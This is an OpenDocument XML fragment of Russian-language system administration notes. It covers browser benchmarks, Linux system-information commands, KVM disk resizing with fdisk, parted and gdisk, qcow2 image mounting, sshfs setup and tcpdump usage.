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9f510"/>
    </style:style>
    <style:style style:name="P5"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1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bfb00"/>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1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c1f28"/>
    </style:style>
    <style:style style:name="P1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2" fo:font-size="14pt" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" style:font-name-asian="Times New Roman3" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman3" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:language="en" fo:country="US"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" fo:language="en" fo:country="US" style:font-name-asian="Times New Roman3" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman3" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#000080" loext:opacity="100%" style:font-name="Times New Roman" fo:font-size="14pt" style:font-name-asian="Times New Roman3" style:font-size-asian="14pt" style:language-asian="ru" style:country-asian="RU" style:font-name-complex="Times New Roman3"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2"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Тесты для браузеров:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">1. Использование ОЗУ после установки;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">2. Использование ОЗУ с 10 открытыми сайтами ((ghacks.net, startpage.com, youtube.com, betanews.com, reddit.com, slashdot.org, producthunt.com, twitch.com, amazon.com, google.com)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">3. Mozilla Kraken benchmark</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">4. JetStream benchmark</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">5. Google Octane benchmark</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">6. RoboHornet benchmark</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T2"><text:span text:style-name="T3">7. Dromaeo benchmark</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T2"><text:span text:style-name="T3">https://nlnetlabs.nl/projects/unbound/about/ - unbound </text:span><text:span text:style-name="T1">вместо</text:span><text:span text:style-name="T3"> bind. </text:span><text:span text:style-name="T1">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https://t.me/KladovkaPavlu/611) dnscrypt-proxy (https://t.me/KladovkaPavlu/225) (рекомендую), Nebulo (https://t.me/KladovkaPavlu/832).</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Полезные команды Linux. Получение различной информации о системе: # arch</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести на экран архитектуру компьютера: # uname -m</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Так-же выводит архитектуру компьютера: # cal 2010</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Печатает календарь на 2010 год. Без аргументов выводит календарь на текущий месяц: # cat /proc/cpuinfo</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести подробную информацию о процессоре: # cat /proc/interrupts</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести информацию о прерываниях: # cat /proc/meminfo</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Выводит статистику использования памяти: # cat /proc/swaps</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести информацию о swap файле(ах) (файл подкачки): # cat /proc/version</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести информацию о версии текущего ядра: # cat /proc/net/dev</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести информацию и статистику по сетевым устройствам: # cat /proc/mounts</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Показать смонтированные файловые системы: # clock -w</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">Записать текущую системную дату в BIOS: # date</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">Вывести текущую системную дату и время: </text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1"># date 041217002007.00</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T1">Установить дату и время в значение МесяцДеньЧасМинутаГод.Секунда: # dmidecode -q</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Вывести в читабельном виде информацию по аппаратному оборудованию системы (SMBIOS / DMI): # hdparm -i /dev/hda</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести характеристики жесткого диска: # hdparm -tT /dev/sda</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Измерять скорость чтения данных с жесткого диска: # lspci -tv</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Вывести список устройств на шине PCI: # lsusb -tv</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T1">Вывести список устройств на USB шине: # uname -r</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">KVM изменить размер диска / blockresize / domblklist / guests linux / mbr /gpt</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Изменение диска offline / qemu-img</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! не забываем делать backup</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">qemu-img resize vmdisk.qcow2 +10G - добавим 10Гб диску vmdisk.img</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Изменение</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">диска</text:span><text:span text:style-name="T3"> online / blockresize</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">virsh blockresize &lt;domain&gt; &lt;path&gt; &lt;size&gt;</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="3"/></text:span><text:span text:style-name="T1">[--domain] &lt;строка&gt; <text:s/>имя домена, ID или UUID</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/>[--path] &lt;строка&gt; <text:s/>Полный путь к блочному устройству</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/>[--size] &lt;число&gt; <text:s/>Новый размер блочного устройства, кратный целому числу (по умолчанию в КиБ)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">virsh domblklist name_VM - узнаем какие диски есть у ВМ</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">virsh blockresize name_VM /kvm/name_VM_disk.qcow2 100G - для ВМ (name_VM), изменим размер диска равный 100Гб</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Необходимые действия для гостя, при изменении диска, MBR диск / один раздел / fdisk:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! Не забываем делать backup </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! Внимание пример для одного диска с одним разделом</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! fdisk -l - посмотреть доступные</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1"><text:s/>fdsik /dev/sda - редактируем таблицу разделов</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1"><text:s text:c="3"/>: p - показываем таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/>Устр-во <text:s text:c="3"/>Загрузочный Start Конец Секторы Size Id Тип</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/>/dev/sda1 <text:s/>* <text:s text:c="11"/>2048 14678015 14675968 <text:s text:c="2"/>7G 83 Linux</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/>: d - удаляем таблицу разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/></text:span><text:span text:style-name="T3">: n - </text:span><text:span text:style-name="T1">создаем</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">таблицу</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">разделов</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="3"/>Do you want to remove the signature? </text:span><text:span text:style-name="T1">[Y]es/[N]o: N - не удаляем сигнатуры</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/>: a - ставим ставим загрузочный бит</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="3"/>: w - применяем изменения</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">!!! после выхода из (fdisk) будет сказано что изменена таблица разделов и необходимо выполнить partprobe</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">(name_VM)# partprobe - выполняем просим систему перечитать таблицу разделов</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">(name_VM)# resize2fs /dev/sda1 - выполняем изменения FS</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">Необходимые действия для гостя, при изменении диска, MBR диск / несколько разделов / parted:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! Не забываем делать backup </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! Внимание пример для одного диска и нескольких разделов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">!!! fdisk -l - посмотреть доступные</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Пример (parted)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">(name_VM)# parted /dev/vda - открываем нужный диск</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="11"/>(parted) print free - покажем доступные <text:s/>разделы (диск /dev/vda)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="15"/></text:span><text:span text:style-name="T3">Number Start End Size Type File system Flags</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="15"/>1 32.3kB 4295MB 4295MB primary ext4 boot</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="15"/>2 4295MB 8590MB 4295MB primary linux-swap(v1)</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="15"/>3 8590MB 107GB 98GB primary ext4</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="17"/>107GB 215GB 107GB Free Space</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="11"/></text:span><text:span text:style-name="T1">(parted) resizepart 3 - изменяем размер третьего раздела</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="15"/></text:span><text:span text:style-name="T3">End [107GB]? 215GB</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="11"/>(parted) quit - </text:span><text:span text:style-name="T1">выходим</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">из</text:span><text:span text:style-name="T3"> parted</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">(name_VM)#partprobe - выполняем просим систему перечитать таблицу разделов</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">(name_VM)#resize2fs /dev/vda3 - <text:s/>выполняем изменения FS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Необходимые действия для гостя, при изменении диска, GBT диск / несколько разделов / parted: !!! GPT Рассматривается схема с одним разделом (/dev/vdb1) на весь диск</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">(name_VM)#partprobe</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">(name_VM)#gdisk /dev/vdb</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/></text:span><text:span text:style-name="T1">переходим в расширенный режим x</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="2"/>смещаем запись в конец диска e</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="2"/>выходим из расширенного режима m</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="2"/>Command (? for help): d</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"><text:s text:c="2"/></text:span><text:span text:style-name="T3">Using 1</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>Command (? for help): n</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>Partition number (1-128, default 1): [Enter]</text:span></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>First sector (34-2147483614, default = 2048) or {+-}size{KMGTP}: [Enter]</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>Last sector (2048-2147483614, default = 2147483614) or {+-}size{KMGTP}: [Enter]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>Current type is 'Linux filesystem'</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>Hex code or GUID (L to show codes, Enter = 8300): [Enter]</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/>Changed type of partition to 'Linux filesystem'</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"><text:s text:c="2"/></text:span><text:span text:style-name="T1">выходим с сохранением w</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">(name_VM)#partprobe</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">(name_VM)#resize2fs /dev/vdb1 </text:span><text:span text:style-name="T1">или</text:span></text:p>
      <text:p text:style-name="P6" loext:marker-style-name="T2"><text:span text:style-name="T3">btrfs filesystem resize max /&lt;MOUNTPOINT&gt;</text:span></text:p>
      <text:p text:style-name="P7" loext:marker-style-name="T2"><text:span text:style-name="T1">Смонтировать образ диска qcow2 в гипервизоре:</text:span></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T3">modprobe nbd max_part=8</text:span></text:p>
      <text:p text:style-name="P3" loext:marker-style-name="T2"><text:span text:style-name="T3">qemu-nbd --connect=/dev/nbd0 &lt;PATH-TO-IMAGE&gt;.qcow2</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">fdisk /dev/nbd0 -l</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">mount -o ro /dev/nbd0p1 /mnt/ext0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">umount /mnt/ext0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">qemu-nbd --disconnect /dev/nbd0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">rmmod nbd</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">ssh - sshfs </text:span><text:span text:style-name="T1">монтирование</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">шары</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">SSHFS - монтирование файловых систем средствами ssh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">apt-get install sshfs - установка</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">mkdir /mnt/docs - создаем папку для монтирования</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sshfs user@server.com:/var/docs /mnt/docs - монтируем фс используя sshfs</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">fusermount -u /var/docs - демонтируем удаленную папку</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">монтирование шары sshfs /etc/fstab:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ИМЯ</text:span><text:span text:style-name="T3">@</text:span><text:span text:style-name="T1">ИП</text:span><text:span text:style-name="T3">:/REMOTE/DIR <text:s/>/LOCAL/MOUNT <text:s/>fuse.sshfs _netdev,user,idmap=user,transform_symlinks,identityfile=/home/</text:span><text:span text:style-name="T1">ИМЯ</text:span><text:span text:style-name="T3">/.ssh/id_rsa,allow_other,default_permissions,uid=</text:span><text:span text:style-name="T1">ИД</text:span><text:span text:style-name="T3">,gid=</text:span><text:span text:style-name="T1">ИД</text:span><text:span text:style-name="T3"> 0 0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sshfs для windows:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Dokan SSHFS - монтирование удаленного сетевого хранилища при помощи ssh для Windows</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">https://github.com/dokan-dev/dokany/releases/tag/v1.1.0.2000</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sshfs - монтирование удаленной папки подробней:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Fuse - это модуль ядра (недавно он был принят в официальную ветку 2.6), позволяющий непривилегированным пользователям монтировать различные</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">файловые системы. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Sshfs - это программа, созданная самим автором fuse, которая позволяет монтировать удаленные папки или файловые системы, используя ssh. </text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3"># usermod -G -a fuse user1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">или</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3"># adduser user1 fuse</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">или</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">вручную</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">отредактировав</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span><text:span text:style-name="T3"> /etc/group. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Также необходимо, чтобы был загружен модуль fuse:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1"># modprobe fuse</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если мы планируем использовать fuse и sshfs регулярно, то нужно добавить fuse в файл /etc/modules. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">sshfs user1@remote_server:/tmp ~/remote_folder - смонтировать удаленную папку с помощью sshfs</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T1">fusermount -u ~/remote_folder - мы можем отмантировать ее</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Если мы постоянно работаем с этой папкой, то можно добавить ее в таблицу /etc/fstab. </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">При этом она будет автоматически монтироваться при загрузке системы,</text:span></text:p>
      <text:p text:style-name="P5" loext:marker-style-name="T2"><text:span text:style-name="T3">/tmp /home/user1/remote_folder/ fuse defaults,auto 0 0</text:span><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump / </text:span><text:span text:style-name="T1">снифер</text:span><text:span text:style-name="T3"> / sniffer</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Установка</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">yum install tcpdump - </text:span><text:span text:style-name="T1">установка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> centos</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">apt install tcpdump - </text:span><text:span text:style-name="T1">установка</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> debian</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Опции утилиты tcpdump:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-i интерфейс # Задает интерфейс, с которого необходимо анализировать трафик (без указания интерфейса - анализ "первого попавшегося")</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-n # Отключает преобразование IP в доменные имена. Если указано -nn, то запрещается преобразование номеров портов в название протокола.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-e # Включает вывод данных канального уровня (например, MAC-адреса).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-v # Вывод дополнительной информации (TTL, опции IP).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-s размер # Указание размера захватываемых пакетов. (по умолчанию - пакеты больше 68 байт)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-w имя_файла # Задать имя файла, в который сохранять собранную информацию.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-r имя_файла # Чтение дампа из заданного файла.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-p # Захватывать только трафик, предназначенный данному узлу. (по умолчанию - захват всех пакетов, например в том числе широковещательных).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">-q # Переводит tcpdump в "бесшумный режим", пакет анализируется на транспортном уровне (протоколы TCP, UDP, ICMP), а не на сетевом (протокол IP).</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">-t # Отключает вывод меток времени.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Наиболее часто используемые фильтрующие параметры команды tcpdump:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">dst хост # Проверяет, совпадает ли адрес получателя IP-пакета с указанным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">src хост # Проверяет, совпадает ли адрес отправителя IP пакета с указанным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">host хост # Проверяет, совпадает ли адрес отправителя или получателя с заданным значением. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T1">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ip | arp | rarp | tcp | udp | icmp [хост] # Проверяет, принадлежит ли пакет одному из указанных протоколов и при указании адреса хоста проверяет, </text:span><text:soft-page-break/><text:span text:style-name="T1">совпадает ли адрес отправителя\получателя с заданным. Возможно задавать как IP, подсеть в формате 10.0.0.1/24, так и имя хоста.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">[tcp | udp] port номер_порта # Проверяется, принадлежит ли пакет протоколу TCP/UDP и равен ли порт назначения или источника заданному.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Можно указать номер порта, либо имя, заданное в файле /etc/services.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ether { src | dst | host } MAC_адрес # Проверяется, принадлежит ли сетевой пакет источнику, назначению, источнику или назначению имеющему заданный MAC_адрес.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">ip broadcast # Проверяется, является ли IP пакет широковещательным.</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T1">ether broadcast # Проверяется, является ли ARP-пакет широковещательным.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Примеры использования tcpdump:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -i eth0 # слушаем интерфейс eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump port 80 # слушаем 80 порт</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump host google.com # слушаем трафик с хоста google.com</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -n -i eth0 icmp # </text:span><text:span text:style-name="T1">Ловим</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пакеты</text:span><text:span text:style-name="T3"> icmp (ping pong)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump | grep -v ssh # поиск пакетов исключая пакеты ssh</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -n -i eth0 net 192.168.1.15 # </text:span><text:span text:style-name="T1">трафик</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">с</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T1">на</text:span><text:span text:style-name="T3"> IP</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -n -i eth0 net 192.168.1.0/24 # </text:span><text:span text:style-name="T1">трафик</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">с</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">сеть</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -l &gt; dump &amp;&amp; tail -f dump # </text:span><text:span text:style-name="T1">Вывод</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">с</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">записью</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">в</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -i eth0 -w traffic.eth0 # Информация о трафике записывается в бинарный файл traffic.eth0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -i eth0 -s 0 -w traffic.eth0 # Запись + загрузка в бинарный файл</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -r traffic.eth0 # Читаем из файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T1">tcpdump -i eth0 -X port \(110 or 143\) # Проверка pop и imap на безопасность</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -i eth0 -s 0 -A port 80 | grep GET # (-s 0 </text:span><text:span text:style-name="T1">весь</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">пакет</text:span><text:span text:style-name="T3">, -A </text:span><text:span text:style-name="T1">для</text:span><text:span text:style-name="T3"> ASCII)</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">tcpdump -npi iface_name ether src MAC-address # </text:span><text:span text:style-name="T1">узнать</text:span><text:span text:style-name="T3"> MAC </text:span><text:span text:style-name="T1">устройства</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T2"><text:span text:style-name="T3">iface_name -</text:span><text:span text:style-name="T1">имя</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">интерфейса</text:span><text:span text:style-name="T3"> MAC-address -</text:span><text:span text:style-name="T1">мак</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">адрес</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T1">устройства</text:span></text:p>
